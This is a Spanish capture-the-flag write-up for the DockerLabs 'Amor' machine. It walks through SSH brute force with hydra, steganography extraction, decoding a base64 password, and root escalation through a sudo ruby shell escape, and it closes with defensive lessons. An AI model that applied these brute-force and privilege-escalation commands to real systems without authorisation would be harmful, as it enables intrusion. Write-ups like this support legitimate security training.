# Amor (DockerLabs) — Writeup

Dificultad: fácil-media

Pocas máquinas se toman tan en serio su propio nombre como esta: literalmente hay una carpeta llamada "vacaciones" con una foto de recuerdo, un mensaje de `.bashrc` que empieza con "Hola oscar, recuerdas las vacaciones que pasamos juntos", y una nota final de agradecimiento a la comunidad. Todo el reto está narrado como una historia de dos usuarios, carlota y oscar, cuyo mayor error de seguridad fue confiarle demasiados secretos a la nostalgia.

IP de laboratorio: `172.17.0.2`

---

## Planteamiento

El camino tiene una estructura de posta de relevos: primero hay que entrar como carlota por fuerza bruta directa, después seguir una pista dejada en su propio archivo de configuración de shell hasta una imagen con esteganografía, decodificar lo que se extrae de ahí para conseguir la contraseña de oscar, y finalmente aprovechar un permiso de sudo sobre Ruby para saltar a root. Ningún paso individual es especialmente complejo — la dificultad está en no perder el hilo de la historia que va contando el propio sistema de archivos.

---

## Paso 1: reconocimiento

```bash
nmap -n -Pn -o escaneo -p- --min-rate 5000 172.17.0.2
```

```
22/tcp open  ssh
80/tcp open  http
```

```bash
nmap -n -Pn -o escaneo_versiones -sC -sV 172.17.0.2
```

```
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
|_http-title: SecurSEC S.L
```

El nombre del sitio, "SecurSEC S.L.", tiene su propia ironía — una empresa que se presenta como especializada en seguridad y que, como se verá enseguida, comete varios de los errores más básicos del propio campo en el que dice ser experta.

---

## Paso 2: la web se delata a sí misma

Visitando la página, el contenido estático menciona explícitamente que las contraseñas de la empresa son débiles, y nombra directamente a una empleada: **carlota**. No hace falta enumerar nada más — la propia web está haciendo el trabajo de reconocimiento de usuarios por nosotros, algo que en un pentest real sería justo el tipo de fuga de información que se señala como hallazgo crítico incluso sin necesitar explotación técnica.

---

## Paso 3: fuerza bruta directa contra SSH

Con el nombre de usuario ya confirmado, y sabiendo además que las contraseñas de la organización son flojas por confesión propia del sitio web:

```bash
hydra -l carlota -P rockyou.txt ssh://172.17.0.2 -o resultado.txt
```

```
carlota : babygirl
```

```bash
ssh carlota@172.17.0.2
script /dev/null -c bash
```

Acceso conseguido con el primer usuario de la cadena.

---

## Paso 4: `.bashrc`, el archivo que nadie revisa hasta que debería

En vez de ir directo a buscar SUID o reglas de sudo, merece la pena echar un vistazo a los archivos de configuración personales del usuario — a veces ahí se esconden variables, alias o comentarios que el propio usuario dejó sin pensar en quién más podría leerlos.

```bash
cat .bashrc
```

```bash
export SECRET="Hola oscar, recuerdas las \"vacaciones\" que pasamos juntos? En el interior de nuestro amor hay un secreto. ¿Entiendes?"
```

Una variable de entorno usada, en la práctica, como si fuera una nota personal — dirigida a otro usuario del sistema (**oscar**), con una pista bastante directa: algo relacionado con unas "vacaciones" contiene un secreto oculto.

---

## Paso 5: siguiendo la pista hasta una imagen con secretos

```bash
ls /home/carlota/Desktop/fotos/vacaciones
# imagen.jpg
```

La carpeta existe literalmente, con el nombre exacto mencionado en la pista. Se transfiere la imagen a la máquina atacante para analizarla con calma:

```bash
python3 -m http.server 4343
```

```bash
wget http://172.17.0.2:4343/imagen.jpg
```

```bash
steghide extract -sf imagen.jpg
# Enter passphrase: [Enter, sin contraseña]
```

Aquí hay un detalle que merece mención aparte: la extracción funciona **sin ninguna passphrase**, solo pulsando Enter. Steghide permite proteger el contenido oculto con una contraseña adicional precisamente para evitar que cualquiera con la herramienta pueda extraer el contenido con solo tener el archivo — y aquí esa protección, la única capa de seguridad real que ofrece la esteganografía frente a quien ya sospecha que hay algo escondido, simplemente no se usó.

```bash
cat secret.txt
# ZXNsYWNhc2FkZXBpbnlwb24=
```

Una cadena en Base64, fácilmente identificable por su formato característico:

```bash
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d
# eslacasadepinypon
```

Una contraseña decodificada — y, siguiendo el hilo de la pista del `.bashrc`, todo apunta a que pertenece a **oscar**.

---

## Paso 6: el problema de siempre — reutilizar contraseñas entre cuentas

```bash
ssh oscar@172.17.0.2
# password: eslacasadepinypon
```

Y en efecto, la contraseña extraída de la imagen es válida directamente para SSH. No hubo ningún ataque adicional que hacer — la credencial ya estaba lista para usar, solo escondida tras dos capas de indirección (una pista textual y una imagen esteganografiada).

```bash
cat /home/oscar/Desktop/IMPORTANTE.txt
```

```
Hola ROOT, acuérdate de mirar el documento de tu escritorio.
```

Otro mensaje personal, esta vez dirigido directamente a "ROOT" — una pista de que el siguiente y último salto de esta cadena va sobre escalada de privilegios.

---

## Paso 7: Ruby, otra vez el mismo patrón conocido

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/ruby
```

Ruby, como cualquier intérprete de propósito general, incluye la capacidad de invocar procesos del sistema operativo directamente desde una línea de código. Si se ejecuta con privilegios de root vía sudo, cualquier proceso que lance hereda esos mismos privilegios — el mismo mecanismo, catalogado en GTFOBins, que aparece en tantos otros lenguajes de scripting cuando se conceden sin restricciones a través de sudo.

```bash
sudo ruby -e 'exec "/bin/sh"'
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

Root conseguido, cerrando la cadena de tres usuarios (carlota → oscar → root) que empezó con una simple fuerza bruta.

```bash
cat /root/Desktop/THX.txt
```

Una nota final de agradecimiento a la comunidad de DockerLabs, poniendo el broche a una máquina que, más allá de la técnica, tenía bastante de historia contada a través del propio sistema de archivos.

---

## Resumen técnico

| Fase | Detalle |
|---|---|
| Usuario filtrado | carlota, mencionada directamente en la web |
| Acceso inicial | Fuerza bruta SSH (carlota:babygirl) |
| Pista intermedia | Variable de entorno en `.bashrc` apuntando a una carpeta de "vacaciones" |
| Esteganografía | imagen.jpg → secret.txt, sin passphrase de protección |
| Decodificación | Base64 → contraseña de oscar |
| Segundo usuario | oscar, vía reutilización directa de la contraseña extraída |
| Vector de escalada | `sudo NOPASSWD` sobre `/usr/bin/ruby` |
| Resultado final | root, vía `ruby -e 'exec "/bin/sh"'` |

---

## Qué falló aquí (y cómo se evita)

1. **Nombres de usuario expuestos directamente en contenido público del sitio web.** Cualquier mención de empleados, usuarios o cuentas del sistema en contenido accesible públicamente reduce a la mitad el trabajo de cualquier atacante: ya no hace falta enumerar usuarios, solo contraseñas.
2. **Contraseñas de diccionario confirmadas por la propia organización.** Que el sitio web admita abiertamente que las contraseñas son débiles no es una confesión inocente — es, en la práctica, una invitación a intentar fuerza bruta con diccionarios estándar como rockyou.txt.
3. **Esteganografía usada sin contraseña de protección.** El valor real de esconder datos dentro de una imagen depende casi por completo de que la extracción requiera una passphrase adicional. Sin ella, cualquiera que sospeche que hay contenido oculto (algo bastante fácil de deducir a partir de pistas textuales como la de este reto) puede extraerlo sin ningún esfuerzo.
4. **Reutilización de contraseñas entre distintas cuentas del sistema.** La contraseña extraída de la imagen resultó ser válida tal cual para otra cuenta distinta. Cada credencial debería ser única por cuenta y por servicio, precisamente para que el compromiso de una no arrastre automáticamente al resto.
5. **Permiso de sudo NOPASSWD sobre un intérprete de scripting.** Mismo patrón visto en otras máquinas de este estilo: cualquier lenguaje capaz de invocar comandos del sistema operativo (Ruby, Python, Perl, etc.) equivale a una vía de escalada directa si se concede vía sudo sin restricciones.

---

## Referencias

- GTFOBins — ruby: https://gtfobins.github.io/gtfobins/ruby/
- steghide: http://steghide.sourceforge.net/
- DockerLabs: https://dockerlabs.es/
